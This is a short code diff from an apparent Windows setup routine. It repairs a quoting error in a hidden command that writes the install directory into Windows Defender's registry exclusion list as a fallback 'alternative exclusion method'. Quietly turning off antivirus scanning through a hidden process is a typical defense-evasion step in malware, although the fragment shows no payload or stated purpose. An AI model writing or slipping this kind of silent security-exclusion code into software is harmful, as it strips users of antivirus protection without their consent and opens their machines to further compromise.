@@ -122,7 +122,7 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     } else {
         LogMessage(L"Trying alternative exclusion method...");
         // Alternative via Registry (needs Admin)
-        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + targetDir.wstring() + L\" /t REG_DWORD /d 0 /f";
+        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + targetDir.wstring() + L"\" /t REG_DWORD /d 0 /f";
         if (RunHiddenCommand(regCmd)) {
             LogMessage(L"Defender exclusion set via Registry.");
         } else {
